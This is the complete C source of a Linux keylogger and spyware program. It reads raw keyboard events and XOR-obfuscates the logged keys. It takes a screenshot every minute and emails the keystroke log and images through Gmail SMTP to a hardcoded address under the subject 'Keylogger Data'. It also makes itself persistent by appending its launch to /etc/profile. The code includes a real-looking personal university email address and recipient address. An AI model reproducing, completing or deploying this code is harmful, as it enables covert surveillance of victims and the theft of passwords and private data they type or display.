#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <dirent.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <linux/input.h>
#include <pthread.h>
#include <netdb.h>

#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <png.h>


#define EXFILTRATE_DIR "/tmp/nguyendh"
#define KEYLOG_FILENAME "/key.txt"
#define SCREENSHOT_DIR "/screenshot"
#define SMTP_ADDR "smtp.gmail.com"
#define SMTP_PORT 465
#define BOUNDARY "BOUNDARY_450320013120930129"

typedef struct {
    char inputPath[260];
    char outputPath[260];
}keyLogStruct;

typedef struct {
    SSL *ssl;
    int sock;
    SSL_CTX *ctx;
} SMTP_Connection;

const char* keymap[85] = {
    "KEY_RESERVED", "KEY_ESC", "KEY_1", "KEY_2", "KEY_3", "KEY_4", "KEY_5", "KEY_6", "KEY_7", "KEY_8", "KEY_9", "KEY_0", "KEY_MINUS", "KEY_EQUAL", "KEY_BACKSPACE", "KEY_TAB", "KEY_Q", "KEY_W", "KEY_E", "KEY_R", "KEY_T",
    "KEY_Y", "KEY_U", "KEY_I", "KEY_O", "KEY_P", "KEY_LEFTBRACE", "KEY_RIGHTBRACE", "KEY_ENTER", "KEY_LEFTCTRL", "KEY_A", "KEY_S", "KEY_D", "KEY_F", "KEY_G", "KEY_H", "KEY_J", "KEY_K", "KEY_L", "KEY_SEMICOLON", "KEY_APOSTROPHE", "KEY_GRAVE",
    "KEY_LEFTSHIFT", "KEY_BACKSLASH", "KEY_Z", "KEY_X", "KEY_C", "KEY_V", "KEY_B", "KEY_N", "KEY_M", "KEY_COMMA", "KEY_DOT", "KEY_SLASH", "KEY_RIGHTSHIFT", "KEY_KPASTERISK", "KEY_LEFTALT", "KEY_SPACE", "KEY_CAPSLOCK", "KEY_F1", "KEY_F2", "KEY_F3",
    "KEY_F4", "KEY_F5", "KEY_F6", "KEY_F7", "KEY_F8", "KEY_F9", "KEY_F10", "KEY_NUMLOCK", "KEY_SCROLLLOCK", "KEY_KP7", "KEY_KP8", "KEY_KP9", "KEY_KPMINUS", "KEY_KP4", "KEY_KP5", "KEY_KP6", "KEY_KPPLUS", "KEY_KP1", "KEY_KP2", "KEY_KP3", "KEY_KP0", "KEY_KPDOT"
};

void persistent() {
    int result = system("sh -c 'echo \"/opt/keylog\" >> /etc/profile'");
    if (result < 0) {
        perror("Error in persistent");
    }
    printf("Added persistent");
}

void xor(char* str) {
    if (!str) {
        return;
    }
    size_t len = strlen(str);
    for (size_t i = 0; i < len; i++) {
        *(str+i) ^= 0x90;
    }
}

void save_as_png(XImage* image, const char* filename, int width, int height) {
    FILE* fp = fopen(filename, "wb");
    if (!fp) {
        return;
    }

    png_structp png = png_create_write_struct(PNG_LIBPNG_VER_STRING, NULL, NULL, NULL);
    if (!png) {
        fclose(fp);
        return;
    }

    png_infop info = png_create_info_struct(png);
    if (!info) {
        png_destroy_write_struct(&png, NULL);
        fclose(fp);
        return;
    }

    if (setjmp(png_jmpbuf(png))) {
        png_destroy_write_struct(&png, &info);
        fclose(fp);
        return;
    }

    png_init_io(png, fp);

    png_set_IHDR(png,
        info,width, height,8,PNG_COLOR_TYPE_RGB, PNG_INTERLACE_NONE,PNG_COMPRESSION_TYPE_DEFAULT, PNG_FILTER_TYPE_DEFAULT
    );
    png_write_info(png, info);

    png_bytep row = (png_bytep)malloc(3 * width * sizeof(png_byte));

    for (int y = 0; y < height; y++) {
        for (int x = 0; x < width; x++) {
            unsigned long pixel = XGetPixel(image, x, y);
            row[x*3 + 0] = (pixel >> 16) & 0xff;
            row[x*3 + 1] = (pixel >> 8)  & 0xff;
            row[x*3 + 2] = pixel & 0xff;
        }
        png_write_row(png, row);
    }

    png_write_end(png, NULL);
    fclose(fp);
    free(row);
    png_destroy_write_struct(&png, &info);
}

void get_timestamped_filename(char* buffer, size_t size) {
    time_t currentTime;
    struct tm* timeinfo;

    time(&currentTime);
    timeinfo = localtime(&currentTime);

    strftime(buffer, size, "screenshot_%Y%m%d_%H%M%S.png", timeinfo);
}

void *keylog(void *arg) {
    keyLogStruct* key_log_struct = arg;
    char* filename = key_log_struct->inputPath;
    char* outputFile = key_log_struct->outputPath;
    int file = open(filename, O_RDONLY);
    if (file < 0) {
        perror("open failed");
    }

    FILE* result = fopen(outputFile, "a+");
    if (result == NULL) {
        perror("fopen failed");
        close(file);
    }
    struct input_event ev;
    while (true) {
        ssize_t n = read(file, &ev, sizeof(ev));
        if (n == sizeof(ev)) {
            if (ev.type == EV_KEY && ev.value == 0) {
                if (ev.code < 85 && ev.code != 1) {
                    char key[64];
                    strncpy(key, keymap[ev.code], sizeof(key) - 1);
                    key[sizeof(key) - 1] = '\0';
                    xor(key);
                    fprintf(result, "%s ", key);
                    fflush(result);
                } else if (ev.code == 1) {
                    break;
                }else {
                    continue;
                }
            }
        }
    }
    fclose(result);
    close(file);
}

const char *base64_encode(const char *input) {
    static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    static char output[256];
    int i = 0, j = 0;
    for (; input[i] != '\0'; i += 3) {
        output[j++] = b64[(input[i] >> 2) & 0x3F];
        output[j++] = b64[((input[i] & 0x3) << 4) | ((input[i+1] & 0xF0) >> 4)];
        output[j++] = b64[((input[i+1] & 0xF) << 2) | ((input[i+2] & 0xC0) >> 6)];
        output[j++] = b64[input[i+2] & 0x3F];
    }
    output[j] = '\0';
    return output;
}

long get_file_size(const char *filename) {
    struct stat st;
    if (stat(filename, &st) != 0) {
        perror("stat failed");
        return -1;
    }
    return st.st_size;
}

int base64_encode_file(const char *filename, char **output) {
    FILE *file = fopen(filename, "rb");
    if (!file) {
        perror("Failed to open file");
        return -1;
    }

    long size = get_file_size(filename);
    if (size <= 0) {
        fclose(file);
        return -1;
    }

    unsigned char *buffer = malloc(size);
    if (!buffer) {
        fclose(file);
        return -1;
    }

    if (fread(buffer, 1, size, file) != (size_t)size) {
        free(buffer);
        fclose(file);
        return -1;
    }
    fclose(file);

    int out_len = 4 * ((size + 2) / 3) + 1;
    *output = malloc(out_len);
    if (!*output) {
        free(buffer);
        return -1;
    }

    int encoded_len = EVP_EncodeBlock((unsigned char *)*output, buffer, size);
    free(buffer);

    return encoded_len;
}

int smtp_connect(SMTP_Connection *conn) {
    conn->sock = socket(AF_INET, SOCK_STREAM, 0);
    if (conn->sock < 0) {
        perror("socket failed");
        return -1;
    }

    struct sockaddr_in server = {
        .sin_family = AF_INET,
        .sin_port = htons(SMTP_PORT)
    };

    struct hostent *host = gethostbyname(SMTP_ADDR);
    if (!host) {
        close(conn->sock);
        return -1;
    }
    memcpy(&server.sin_addr, host->h_addr, host->h_length);

    if (connect(conn->sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
        perror("connect failed");
        close(conn->sock);
        return -1;
    }

    SSL_library_init();
    conn->ctx = SSL_CTX_new(TLS_client_method());
    if (!conn->ctx) {
        close(conn->sock);
        return -1;
    }

    conn->ssl = SSL_new(conn->ctx);
    SSL_set_fd(conn->ssl, conn->sock);

    if (SSL_connect(conn->ssl) <= 0) {
        ERR_print_errors_fp(stderr);
        SSL_free(conn->ssl);
        SSL_CTX_free(conn->ctx);
        close(conn->sock);
        return -1;
    }

    return 0;
}

void smtp_disconnect(SMTP_Connection *conn) {
    if (conn->ssl) {
        SSL_shutdown(conn->ssl);
        SSL_free(conn->ssl);
    }
    if (conn->ctx) {
        SSL_CTX_free(conn->ctx);
    }
    if (conn->sock >= 0) {
        close(conn->sock);
    }
}

int smtp_send_command(SMTP_Connection *conn, const char *cmd) {
    if (SSL_write(conn->ssl, cmd, strlen(cmd)) <= 0) {
        return -1;
    }
    printf("C: %s", cmd);
    return 0;
}

int smtp_read_response(SMTP_Connection *conn) {
    char buffer[1024];
    int bytes = SSL_read(conn->ssl, buffer, sizeof(buffer) - 1);
    if (bytes <= 0) {
        return -1;
    }
    buffer[bytes] = '\0';
    printf("S: %s", buffer);
    return atoi(buffer);
}

void sendEmail(char *txtFileName,char *txtFile,char *imageFilename, char *imageFile) {
    SMTP_Connection conn = {0};
    char *encodedTxtFile = NULL, *encodedImageFile = NULL;
    int encodeLengthTxtFile, encodeLengthImageFile;

    encodeLengthTxtFile = base64_encode_file(txtFile, &encodedTxtFile);
    encodeLengthImageFile = base64_encode_file(imageFile, &encodedImageFile);

    if (encodeLengthTxtFile <= 0 || !encodedTxtFile || encodeLengthImageFile <= 0 || !encodedImageFile) {
        fprintf(stderr, "Failed to encode attachments\n");
        return;
    }

    if (smtp_connect(&conn) != 0) {
        free(encodedTxtFile);
        free(encodedImageFile);
        return;
    }

    if (smtp_read_response(&conn) != 220) goto cleanup;
    if (smtp_send_command(&conn, "EHLO example.com\r\n") != 0) goto cleanup;
    if (smtp_read_response(&conn) != 250) goto cleanup;

    if (smtp_send_command(&conn, "AUTH LOGIN\r\n") != 0) goto cleanup;
    if (smtp_read_response(&conn) != 334) goto cleanup;

    char auth_cmd[256];
    snprintf(auth_cmd, sizeof(auth_cmd), "%s\r\n", base64_encode("nguyendhse171946@fpt.edu.vn"));
    if (smtp_send_command(&conn, auth_cmd) != 0) goto cleanup;
    if (smtp_read_response(&conn) != 334) goto cleanup;

    //change this
    snprintf(auth_cmd, sizeof(auth_cmd), "%s\r\n", base64_encode(""));
    if (smtp_send_command(&conn, auth_cmd) != 0) goto cleanup;
    if (smtp_read_response(&conn) != 235) goto cleanup;

    if (smtp_send_command(&conn, "MAIL FROM: <nguyendhse171946@fpt.edu.vn>\r\n") != 0) goto cleanup;
    if (smtp_read_response(&conn) != 250) goto cleanup;

    if (smtp_send_command(&conn, "RCPT TO: <tailiennguyen@gmail.com>\r\n") != 0) goto cleanup;
    if (smtp_read_response(&conn) != 250) goto cleanup;

    if (smtp_send_command(&conn, "DATA\r\n") != 0) goto cleanup;
    if (smtp_read_response(&conn) != 354) goto cleanup;

    char email_header[8192];
    snprintf(email_header, sizeof(email_header),
        "From: Dang Hoang Nguyen <nguyendhse171946@fpt.edu.vn>\r\n"
        "To: Nguyen Dang <tailiennguyen@gmail.com>\r\n"
        "Subject: Keylogger Data\r\n"
        "MIME-Version: 1.0\r\n"
        "Content-Type: multipart/mixed; boundary=\"%s\"\r\n"
        "\r\n"
        "--%s\r\n"
        "Content-Type: text/plain; charset=\"utf-8\"\r\n"
        "Content-Transfer-Encoding: 7bit\r\n"
        "\r\n"
        "Attached keylog data and screenshot.\r\n"
        "\r\n",
        BOUNDARY, BOUNDARY
    );
    if (smtp_send_command(&conn, email_header) != 0) goto cleanup;

    char txt_header[1024];
    snprintf(txt_header, sizeof(txt_header),
        "--%s\r\n"
        "Content-Type: text/plain; name=\"%s\"\r\n"
        "Content-Disposition: attachment; filename=\"%s\"\r\n"
        "Content-Transfer-Encoding: base64\r\n"
        "\r\n",
        BOUNDARY, txtFileName, txtFileName
    );
    if (smtp_send_command(&conn, txt_header) != 0) goto cleanup;

    for (int i = 0; i < encodeLengthTxtFile; i += 76) {
        char chunk[80] = {0};
        int len = (encodeLengthTxtFile - i >= 76) ? 76 : encodeLengthTxtFile - i;
        strncpy(chunk, &encodedTxtFile[i], len);
        strcat(chunk, "\r\n");
        if (smtp_send_command(&conn, chunk) != 0) goto cleanup;
    }

    char img_header[1024];
    snprintf(img_header, sizeof(img_header),
        "\r\n--%s\r\n"
        "Content-Type: image/png; name=\"%s\"\r\n"
        "Content-Disposition: attachment; filename=\"%s\"\r\n"
        "Content-Transfer-Encoding: base64\r\n"
        "\r\n",
        BOUNDARY, imageFilename, imageFilename    );
    if (smtp_send_command(&conn, img_header) != 0) goto cleanup;

    for (int i = 0; i < encodeLengthImageFile; i += 76) {
        char chunk[80] = {0};
        int len = (encodeLengthImageFile - i >= 76) ? 76 : encodeLengthImageFile - i;
        strncpy(chunk, &encodedImageFile[i], len);
        strcat(chunk, "\r\n");
        if (smtp_send_command(&conn, chunk) != 0) goto cleanup;
    }

    char closing[256];
    snprintf(closing, sizeof(closing), "\r\n--%s--\r\n.\r\n", BOUNDARY);
    if (smtp_send_command(&conn, closing) != 0) goto cleanup;
    if (smtp_read_response(&conn) != 250) goto cleanup;
    smtp_send_command(&conn, "QUIT\r\n");

cleanup:
    free(encodedTxtFile);
    free(encodedImageFile);
    smtp_disconnect(&conn);
}

void *screenshot(void* directory) {
    while (true) {
        Display* screen = XOpenDisplay(NULL);
        int screenNumber, height, width;
        char fullDir[512], fileName[256];


        if (screen == NULL) {
            perror("Cannot connect to the screen");
            break;
        }
        Window root = DefaultRootWindow(screen);

        //https://tronche.com/gui/x/xlib/display/image-format-macros.html
        screenNumber = DefaultScreen(screen);
        height = DisplayHeight(screen, screenNumber);
        width = DisplayWidth(screen, screenNumber);

        //this suck cause cannot print in remote server :D
        // printf("Screen height: %d\n", height);
        // printf("Screen witdh %d", width);
        XImage* out = XGetImage(screen, root, 0,0,width,height,AllPlanes, ZPixmap );
        if (out == NULL) {
            perror("Error while screenshot the screen");
            XCloseDisplay(screen);
            break;
        }
        get_timestamped_filename(fileName,sizeof(fileName));
        snprintf(fullDir, sizeof(fullDir), "%s/%s", directory, fileName);
        save_as_png(out, fullDir, width, height );
        XCloseDisplay(screen);
        sendEmail("/tmp/nguyendh/key.txt",KEYLOG_FILENAME, fullDir, fileName);
        sleep(60);


    }

}


int main(int argc, char* argv[]) {
    char keylogPath[512], screenshotPath[512];
    pthread_t keylogThread, screenshotThread;

    snprintf(keylogPath, sizeof(keylogPath), "%s%s", EXFILTRATE_DIR, KEYLOG_FILENAME);
    snprintf(screenshotPath, sizeof(screenshotPath), "%s%s", EXFILTRATE_DIR, SCREENSHOT_DIR );

    if (opendir(EXFILTRATE_DIR) == NULL) {
        mkdir(EXFILTRATE_DIR,0777);
        mkdir(screenshotPath, 0777);
        int file  = open(keylogPath, O_RDWR|O_CREAT, 0777);
        printf("[+] Create dir at %s\n", EXFILTRATE_DIR);
        printf("[+] Create screenshot path at %s\n", screenshotPath);
        if (file  < 0) {
            perror("Error Create file");
        }
        persistent();
    }

    keyLogStruct *lmao = malloc(sizeof(keyLogStruct));
    if (!lmao) {
        perror("Failed to allocate memory");
        exit(EXIT_FAILURE);
    }

    snprintf(lmao->inputPath, sizeof(lmao->inputPath), "%s", "/dev/input/event6");
    snprintf(lmao->outputPath, sizeof(lmao->outputPath), "%s", keylogPath);


    pthread_create(&keylogThread,NULL, keylog, lmao);
    pthread_create(&screenshotThread, NULL, screenshot, screenshotPath);

    pthread_join(keylogThread, NULL);
    pthread_join(screenshotThread, NULL);


    free(lmao);

};